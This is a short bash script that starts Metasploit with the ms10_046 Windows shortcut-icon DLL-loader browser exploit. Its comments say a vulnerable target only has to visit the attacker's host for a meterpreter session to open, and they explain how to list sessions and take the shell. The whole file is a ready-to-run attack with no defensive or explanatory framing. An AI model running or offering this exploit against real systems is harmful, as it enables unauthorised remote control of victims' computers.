#!/bin/bash

#runs the exploit from msfconsole. All that is required is for a vulnerable target to access http://<host ip address> from a browser

msfconsole -x "use exploit/windows/browser/ms10_046_shortcut_icon_dllloader;\

	exploit"

#after target accesses this browser then a meterpreter session should open
#use "sessions -l" to find the job id and "sessions i <job id> to access shell if not automatically given access
